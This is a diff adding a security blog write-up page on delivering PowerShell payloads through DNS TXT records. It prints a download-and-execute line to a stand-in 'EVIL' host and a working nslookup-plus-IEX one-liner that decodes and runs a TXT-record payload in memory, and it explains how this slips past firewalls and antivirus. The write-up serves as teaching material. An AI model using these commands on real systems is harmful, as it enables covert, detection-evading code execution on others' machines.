@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>PS File Transfer via DNS Lookup</title>
+<link rel="stylesheet" href="https://pages-themes.github.io/hacker/assets/css/style.css">
+<link rel="stylesheet" href="../style.css?v=4"/>
+</head>
+<body>
+<header>
+  <h1 class="terminal-title" aria-label="Zerotrace Logs">
+    <span class="prompt" aria-hidden="true">$</span>
+    <span class="typed" id="term-typing" aria-hidden="true"></span>
+    <span class="cursor" id="term-cursor" aria-hidden="true"></span>
+    <span class="sr-only">Zerotrace Logs</span>
+  </h1>
+</header>
+
+<!-- Side hamburger control -->
+<button id="sidebarToggle" class="hamburger-btn" aria-label="Toggle navigation" aria-controls="sidebar" aria-expanded="true">
+  <span class="sr-only">Toggle navigation</span>
+  <span class="hamburger-icon" aria-hidden="true"></span>
+</button>
+
+<!-- Sidebar navigation -->
+<aside class="sidebar" id="sidebar" aria-label="Main navigation">
+  <div class="sidebar-header">
+    <h3>Navigate</h3>
+    <button id="sidebarClose" class="sidebar-close" aria-label="Close navigation"><span aria-hidden="true">×</span></button>
+  </div>
+  <div class="sidebar-content">
+    <ul class="sidebar-nav">
+      <li><a href="../index.html">Home</a></li>
+      <li class="has-submenu">
+        <button class="submenu-toggle" aria-expanded="true"><span class="arrow" aria-hidden="true"></span>Writeups</button>
+        <ul class="submenu">
+          <li><a href="ps-file-transfer-dns.html">PS File Transfer via DNS Lookup</a></li>
+        </ul>
+      </li>
+      <li><a href="../vector2.html">Machines Walkthroughs</a></li>
+      <li><a href="../vector3.html">Certification Journey</a></li>
+      <li><a href="../vector4.html">Projects</a></li>
+    </ul>
+  </div>
+</aside>
+<div class="sidebar-backdrop" id="sidebarBackdrop" aria-hidden="true"></div>
+
+<section>
+  <h2>PS File Transfer via DNS Lookup</h2>
+    <p><img src="../assets/file_tranfer_dns.png" alt="File tranfer via DNS"></p>
+
+  <h3>Why DNS file transfers are used?</h3>
+  <p>Attackers sometimes leverage DNS for data transfer because it’s one of the few outbound protocols almost always allowed through firewalls. By embedding payload data inside DNS queries or responses (like TXT records), they can bypass network egress restrictions or detection systems that monitor HTTP/S or FTP traffic. In short, DNS is “noisy but trusted,” so it can be abused for covert communication or command and control.</p>
+
+  <h3><span class="step">[>]</span> Payload in test.ps1 (example)</h3>
+  <pre><code class="language-powershell">IEX (New-Object Net.Webclient).downloadstring("http://EVIL/evil.ps1")</code></pre>
+  <h3><span class="step">[>]</span> Converting .ps1 to base64 string with PowerShell</h3>
+  <pre><code class="language-powershell">[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\\Users\\peter\\Desktop\\test.ps1"))</code></pre>
+  <p><img src="../assets/image.png" alt="Base64 conversion screenshot"></p>
+
+  <h3>Why payloads are encoded in Base64?</h3>
+  <p>Base64 encoding doesn’t encrypt the payload; it simply transforms binary data into ASCII text. Core reasons:</p>
+  <ol>
+    <li>Prevents corruption or blocking when sending binary data over text-based protocols (PowerShell, HTTP, DNS).</li>
+    <li>Obscures raw payload content slightly, reducing basic string-based detection or accidental alteration.</li>
+  </ol>
+
+  <h3><span class="step">[>]</span> TXT record that has the payload</h3>
+  <p><img src="../assets/image 1.png" alt="TXT record screenshot"></p>
+
+  <h3><span class="step">[>]</span> Validate with nslookup</h3>
+  <p><img src="../assets/image 2.png" alt="nslookup validation screenshot"></p>
+
+  <h3><span class="step">[>]</span> Command to query and execute the payload</h3>
+  <p class="note">Replace <strong>DOMAIN NAME</strong> with your domain (e.g., <code>example.com</code>).</p>
+  <pre><code class="language-powershell">IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((nslookup -querytype=txt "DOMAIN NAME" | Select-String '\"\*\"') -split '\"'[0]))))</code></pre>
+ <h3>Why payloads are executed in memory?</h3>
+<p> Executing payloads directly in memory (fileless execution) avoids writing to disk, which is where most antivirus and EDR tools monitor and scan. Memory-only execution helps evade signature-based detection and leaves minimal forensic artifacts. It’s a way to operate stealthily and reduce the footprint of an intrusion.</p>
+<h3>What did we achieved with the above techique?</h3>
+<p>This technique demonstrates how PowerShell can execute code entirely in memory without writing anything to disk, using DNS as a covert delivery channel. By retrieving and decoding commands from a DNS TXT record, then executing them with IEX, it simulates a fileless, multi-stage execution chain.</p>
+</section>
+
+<footer>
+  <div class="social-links" aria-label="Social media">
+    <a href="https://github.com/0x0Trace" class="social github" target="_blank" rel="noopener" aria-label="GitHub profile">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M12 .5C5.65.5.5 5.65.5 12c0 5.08 3.29 9.38 7.86 10.9.58.1.8-.25.8-.56 0-.27-.01-1.14-.02-2.07-3.2.7-3.88-1.36-3.88-1.36-.53-1.34-1.3-1.7-1.3-1.7-1.06-.73.08-.72.08-.72 1.17.08 1.78 1.2 1.78 1.2 1.05 1.79 2.75 1.27 3.42.97.11-.76.41-1.27.75-1.56-2.55-.29-5.23-1.28-5.23-5.7 0-1.26.45-2.3 1.2-3.11-.12-.29-.52-1.46.11-3.04 0 0 .97-.31 3.18 1.19a11.08 11.08 0 0 1 2.9-.39c.98 0 1.97.13 2.9.39 2.2-1.5 3.17-1.19 3.17-1.19.63 1.58.23 2.75.12 3.04.75.81 1.2 1.85 1.2 3.11 0 4.43-2.69 5.41-5.25 5.69.42.36.8 1.08.8 2.18 0 1.58-.02 2.85-.02 3.24 0 .31.21.67.81.55A10.52 10.52 0 0 0 23.5 12c0-6.35-5.15-11.5-11.5-11.5Z"/>
+      </svg>
+    </a>
+    <a href="https://www.linkedin.com/in/zerotrace/" class="social linkedin" target="_blank" rel="noopener" aria-label="LinkedIn profile">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M4.98 3.5c0 1.38-1.13 2.5-2.5 2.5A2.5 2.5 0 0 1 0 3.5C0 2.12 1.12 1 2.49 1a2.5 2.5 0 0 1 2.49 2.5ZM.5 23.5h4V7.99h-4V23.5Zm7.5 0h4v-8.32c0-2.21 2.4-3.46 3.94-2.02.5.47.56 1.13.56 1.86v8.48h4v-9.56c0-5.06-5.5-4.86-6.5-2.38V8h-4c.06 1.05 0 15.5 0 15.5Z"/>
+      </svg>
+    </a>
+  </div>
+  <p>&copy; 2025 Zerotrace | Built by Zerotrace</p>
+</footer>
+<script src="../script.js"></script>
+</body>
+</html>
